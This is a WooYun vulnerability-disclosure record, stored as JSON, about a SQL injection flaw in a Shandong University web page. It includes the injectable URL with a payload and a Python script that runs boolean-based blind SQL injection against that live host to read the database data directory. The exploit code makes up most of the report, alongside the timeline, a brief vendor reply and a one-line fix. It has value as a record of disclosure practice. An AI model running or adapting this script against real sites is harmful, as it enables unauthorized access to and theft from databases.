{"id": 82450, "wybug_id": "wooyun-2015-0151031", "wybug_title": "山东大学某处GET型注入漏洞（附验证脚本）", "wybug_corp": "山东大学", "wybug_author": "路人甲", "wybug_date": "2015-11-01 22:55", "wybug_open_date": "2015-12-17 13:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 山东大学某处GET型注入漏洞附利用脚本 详细说明：  http://huanke.sdu.edu.cn/english/index.php?action=professors&columnid=52%20and%20ascii(mid(@@datadir,1,1))>1--参数columnid存在注入漏洞利用脚本：\n#coding=utf-8import sys,urllib2from optparse import OptionParserfrom urllib2 import Request,urlopen,URLError,HTTPErrorimport urllibresult=''def request(URL,data):    #print URL    user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }    req = urllib2.Request(URL, data, user_agent)    try:        request = urllib2.urlopen(req)    except HTTPError, e:        if e.code == 500:            return 'Runtime Error'    except URLError, e:        #print('[!] We failed to reach a server.')        #print('[!] Reason: ' + str(e.reason))        sys.exit(1)    return request.read()def binary_sqli(left, right, index):   global result   while 1:        mid = (left + right)/2        if (right-left==1):            result += chr(right)            print 'datadir: ' ,result            break        payload = \"52%%20and%%20ascii(mid(@@datadir,%s,1))>%s--\" % (index, mid)        print payload       # payload=\"\"        html = request('http://huanke.sdu.edu.cn/english/index.php?action=professors&columnid='+payload,None)        #print html        verify = 'yan wang'        if verify  in html:            left = mid        else:            right = midif __name__ == '__main__':    for i in range(1,21):        binary_sqli(32, 127, i)\n   漏洞证明：  \n\n   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-11-02 13:38 厂商回复： 已通报系统所属单位 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}